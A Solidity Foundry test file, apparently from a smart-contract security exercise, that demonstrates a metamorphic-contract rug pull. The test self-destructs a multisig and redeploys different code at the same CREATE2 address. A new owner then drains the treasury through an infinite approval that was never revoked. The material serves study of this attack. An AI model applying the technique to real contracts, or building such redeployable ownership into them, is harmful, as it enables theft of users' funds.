// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {MetamorphicFactory} from "../../src/Proxy/metamorphic_rug/MetamorphicFactory.sol";
import {Multisig} from "../../src/Proxy/metamorphic_rug/Multisig.sol";
import {Multisig2} from "../../src/Proxy/metamorphic_rug/Multisig2.sol";
import {Treasury} from "../../src/Proxy/metamorphic_rug/Treasury.sol";
import {Destroy} from "../../src/Proxy/metamorphic_rug/Destroy.sol";
import "../../src/Proxy/metamorphic_rug/TreasuryToken.sol";

contract MetamorphicRug is Test {
    TreasuryToken public token;

    MetamorphicFactory public factory;

    address public multisigAddr;
    address public treasuryAddr;
    address public multisigOwner;

    function setUp() public {
        factory = new MetamorphicFactory();
        bytes memory bytecode = abi.encodePacked(vm.getCode("Multisig.sol"));

        multisigAddr = factory.deploy(1, bytecode);

        //initialize multisig owner
        multisigOwner = address(1234);
        vm.prank(multisigOwner);
        Multisig(multisigAddr).initialize();

        //deploy token
        token = new TreasuryToken();

        treasuryAddr = address(new Treasury());
        vm.prank(multisigAddr);
        Treasury(treasuryAddr).initialize(token);

        // put some tokens in the treasury
        token.mint(treasuryAddr, 7 ether);

        // why we call selfdestruct here,reason: https://github.com/foundry-rs/foundry/issues/1543
        address destroyAddr = address(new Destroy());
        vm.prank(multisigOwner);
        Multisig(multisigAddr).transferFromContract(destroyAddr); // Calls selfdestruct on the multisig
    }

    function testSetupSuccess() public view {
        assertEq(Multisig(multisigAddr).owner(), multisigOwner);
        assertEq(Treasury(treasuryAddr).owner(), multisigAddr);
        assertEq(token.allowance(treasuryAddr, multisigAddr), type(uint256).max);
        assertEq(token.balanceOf(treasuryAddr), 7 ether);
    }

    function testMetamorphicRug() public {
        //so now the original contract have been destoryed, we need to deploy a new contract to replace it
        bytes memory bytecode = abi.encodePacked(vm.getCode("Multisig2.sol"));
        address newMultisigAddr = factory.deploy(1, bytecode);
        assertEq(newMultisigAddr, multisigAddr);
        assertEq(Treasury(treasuryAddr).owner(), newMultisigAddr);

        // confirm new multisig contract still has infinite approve from treasury
        assertEq(token.allowance(treasuryAddr, newMultisigAddr), type(uint256).max);

        // bob can initialize new multisig to become owner
        address bob = address(99);
        vm.prank(bob);
        Multisig2(multisigAddr).initialize();
        assertEq(Multisig(multisigAddr).owner(), bob);

        // new multisig contract owner bob can transfer all funds from treasury to bob's wallet
        // this is possible because the treasury set infinite approve to multisig contract address
        vm.prank(bob);
        Multisig2(multisigAddr).transferFromTreasury(treasuryAddr);
        assertEq(token.balanceOf(treasuryAddr), 0 ether);
        assertEq(token.balanceOf(bob), 7 ether);
    }
}
